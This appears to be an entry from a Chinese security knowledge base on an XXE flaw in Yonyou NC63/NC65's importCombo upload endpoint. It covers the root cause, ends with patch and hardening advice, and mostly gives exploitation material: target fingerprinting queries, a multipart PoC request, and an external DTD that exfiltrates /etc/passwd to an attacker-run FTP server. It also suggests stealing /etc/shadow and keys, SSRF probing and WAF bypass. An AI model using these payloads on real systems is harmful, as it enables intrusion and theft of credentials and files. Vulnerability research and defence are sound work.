---
id: web-java-component-yonyou-nc-comboopertools-importcombo-jaxb-xxe
title: 用友 NC ComboOperTools importCombo JAXB XXE：setExpandEntityReferences(false) 仍解析外部实体并 OOB 读文件
type: scenario
domain: web
path: web/java/component
technique: yonyou-nc-comboopertools-importcombo-jaxb-xxe
aliases:
- 用友 NC XXE
- ComboOperTools XML 实体注入
- /portal/pt/portalcombo/importCombo
- PortalComboAction importCombo
- JaxbMarshalFactory.encodeXML
- importCombo?pageId=login
- NC63 XXE
- NC65 XXE
tags:
- java
- yonyou
- nc
- nc63
- nc65
- xxe
- jaxb
- unmarshaller
- documentbuilderfactory
- oob
- ftp
- component
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-07'
affected_versions: 用友 NC63（补丁包低于 NCM_NC6.3_000_109902_20250730_GP_868581196）；用友 NC65（补丁包低于 SUPPORT-NC6.5-Security-20250728171039-122782）
verification:
  verified_by: verifier-V247
  verified_at: '2026-11-07T12:43:43+08:00'
  notes: 已对照原文核对：官方通告/补丁号 NCM_NC6.3_000_109902_20250730_GP_868581196 与 SUPPORT-NC6.5-Security-20250728171039-122782 与原文一致，affected_versions 已按原文写入；PortalComboAction#importCombo→ComboOperTools.doImPort→JaxbMarshalFactory.encodeXML(setExpandEntityReferences(false)+parse) 链、DNSLog POC、data.dtd+230-OOB FTP 外带 /etc/passwd 均与源码截图/复现截图一致。未验证点：未复跑请求；frontmatter 无 sources/source_url。
---

## 一句话结论

用友 NC 的 `portal/pt/portalcombo/importCombo?pageId=login` 接口把 multipart 上传文件交给 `ComboOperTools.doImPort()`，后者经 `JaxbMarshalFactory.encodeXML()` 用 `DocumentBuilderFactory.newInstance()` 创建解析器并仅设置 `setExpandEntityReferences(false)` 后 `parse()`；该设置不阻止外部实体加载，提交带 `SYSTEM` 实体的 XML 即可触发 XXE，原文用 DNSLog 确认，并通过外部 DTD + FTP 外带读取 `/etc/passwd`。

## 原理

- 入口：`PortalComboAction#importCombo()`，路由 `/portalcombo` 下的 `importCombo`（实际请求为 `/portal/pt/portalcombo/importCombo?pageId=login`）。方法用 `CommonsMultipartResolver` 解析上传请求，取 `fileMap` 的第一个 `MultipartFile` 的 `InputStream`，调用 `ComboOperTools.doImPort(in)`。
- 解析链：`ComboOperTools.doImPort()` 先 `IOUtils.toString(in)` 把整个文件读成字符串，再调用 `JaxbMarshalFactory.newIns().encodeXML(ComboPackObj.class, xml)`。
- 关键缺陷在 `JaxbMarshalFactory.encodeXML()`：
  ```java
  DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
  dbf.setExpandEntityReferences(false);
  DocumentBuilder db = dbf.newDocumentBuilder();
  Document document = db.parse(new ByteArrayInputStream(xml.getBytes("UTF-8")));
  return (T) um.unmarshal(document);
  ```
  代码没有设置 `disallow-doctype-decl`，没有关闭 `external-general-entities`/`external-parameter-entities`，也没有限制 `ACCESS_EXTERNAL_DTD` 或提供空 `EntityResolver`。
- `setExpandEntityReferences(false)` 的语义是“在 DOM 中保留 EntityReference 节点、不把实体内容替换进文档树”，但**解析器在 parse 阶段仍会去解析实体声明并加载外部资源**（SYSTEM 指向的文件或 URL）。因此外部 DTD、外部实体照样被请求，危害在 `parse()` 时已经发生；后续 JAXB `unmarshal` 是否展开实体并不影响 SSRF/文件读取。
- 利用方式：XML 中用参数实体引用攻击者 HTTP 上的外部 DTD；DTD 里用 `file:///etc/passwd` 定义实体，再把内容拼进 `ftp://attacker:2121/%d;` 的 URL。目标解析器读取本地文件后向攻击者 FTP 发起带文件内容的请求，实现 OOB 文件外带。HTTP 回连 URL 长度有限，读 `/etc/passwd` 这类较长文件时原文改用 FTP。
- 该接口位于 `pageId=login` 的登录门户路径，攻击面为对外可访问的 NC 登录入口；响应即使为 500（XML 结构不满足业务对象），DNS/FTP 外带仍能证明解析发生。

## 触发条件

- 目标为未打补丁的用友 NC63/NC65（补丁低于上文 affected_versions 所列版本）。
- `/portal/pt/portalcombo/importCombo?pageId=login` 可从攻击者网络访问。
- 服务器能向外发起 HTTP/DNS/FTP 请求（OOB 外带需要）；纯带内文件读取则需错误信息或响应回显。
- 上传内容作为第一个 multipart 文件的正文提交，字段名任意（原文用 `file`）。

## 利用步骤

1. 指纹识别：FOFA `app="用友-UFIDA-NC"` 或 Hunter `web.body="uap/rbac"`，确认目标为用友 NC。
2. DNSLog 验证：向 `importCombo?pageId=login` 发送 multipart 请求，文件内容为带外部参数实体的 XML，指向自己的 DNSLog 域名；观察 DNS 记录。
3. 任意文件读取：在 VPS 上放置 `data.dtd`，内容用 `file://` 读取目标文件，并把内容拼进 `ftp://VPS:2121/%d;`；同目录启动 HTTP 服务供目标拉取 DTD。
4. 在 VPS 上启动 230-OOB 伪 FTP 服务监听 2121。
5. 发送引用 `data.dtd` 的 XML，目标先请求 `http://VPS:8081/data.dtd`，再按 DTD 读取 `/etc/passwd` 并通过 FTP 发回；FTP 服务端打印文件内容。
6. 更换 `file://` 路径读取其他敏感文件（配置、密钥、`/etc/shadow` 等）；也可把 SYSTEM 指向内网地址做 SSRF 探测。

## PoC

DNSLog 验证（multipart 文件内容）：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY % remote SYSTEM "http://<dnslog-domain>">
%remote;]>
<root/>
```

```http
POST /portal/pt/portalcombo/importCombo?pageId=login HTTP/1.1
Host: target
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="1.png"

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY % remote SYSTEM "http://<dnslog-domain>">
%remote;]>
<root/>
------WebKitFormBoundary--
```

OOB 文件读取：

```bash
# VPS: /var/www/data.dtd
cat > data.dtd <<'EOF'
<!ENTITY % d SYSTEM "file:///etc/passwd">
<!ENTITY % c "<!ENTITY rrr SYSTEM 'ftp://VPS_IP:2121/%d;'>">
EOF

# VPS: 提供 DTD
python3 -m http.server 8081 --bind 0.0.0.0

# VPS: 启动 230-OOB 伪 FTP
python3 230.py 2121
```

```xml
<?xml version="1.0"?>
<!DOCTYPE cdl [
<!ENTITY % asd SYSTEM "http://VPS_IP:8081/data.dtd">%asd;%c;]>
<cdl>&rrr;</cdl>
```

把上述 XML 作为 multipart 文件内容提交后，HTTP 日志出现 `GET /data.dtd`，FTP 2121 端口收到 `/etc/passwd` 内容。

## 变体与关联

- 变体：直接 `<!ENTITY xxe SYSTEM "file:///etc/passwd">` 并把 `&xxe;` 放进业务字段，若响应/异常回显实体内容则可带内读取。
- 变体：外部实体指向内网 HTTP 服务做 SSRF；用 UTF-16/UTF-16BE 编码绕过只匹配 UTF-8 的 WAF；用参数实体 + 外部 DTD 外带任意文件。
- 变体：同一套 `JaxbMarshalFactory.encodeXML()` 若被其他上传/导入接口复用，同样受影响的入口可替换为那些路由。
- 关联：默认 DocumentBuilderFactory 导致带内文件读取 [[web-generic-xxe-inband-file-read-default-insecure]]；JAXB/组件解析 XXE [[web-java-xxe-nacos-spring-context-config-parse]]；OOB 外带方法 [[web-generic-xxe-oob-exfil]]；同系统其他漏洞 [[web-java-component-yonyou-nc65-mtapptimeline-doapply-sqli]]、[[web-java-component-yonyou-nc65-courseware-download-fileread]]。
- 边界：已安装官方补丁、解析器禁用 DOCTYPE/外部实体、设置安全处理特性与空 EntityResolver、或服务器无外网/DNS 且响应不回显时，利用失败。

## 检测与防御

- 检测：请求 `/portal/pt/portalcombo/importCombo` 的 multipart 内容含 `<!DOCTYPE`、`<!ENTITY`、`SYSTEM`、`file://`、`ftp://`；应用服务器异常外连 DNS/HTTP/FTP；`JaxbMarshalFactory` 日志出现 `encodeXML` 解析错误并带 XML 原文。
- 修复：安装用友官方补丁（NC63 `NCM_NC6.3_000_109902_20250730_GP_868581196`、NC65 `SUPPORT-NC6.5-Security-20250728171039-122782`）。
- 加固：解析前 `dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true)`，关闭外部通用/参数实体，设置 `ACCESS_EXTERNAL_DTD`/`ACCESS_EXTERNAL_SCHEMA` 为空，使用空 EntityResolver；不要仅依赖 `setExpandEntityReferences(false)`。
- 网络：限制应用服务器出站 DNS/HTTP/FTP；在网关/WAF 层拦截含 DOCTYPE/ENTITY 的 multipart 文件；对导入接口增加鉴权、文件类型与内容校验。
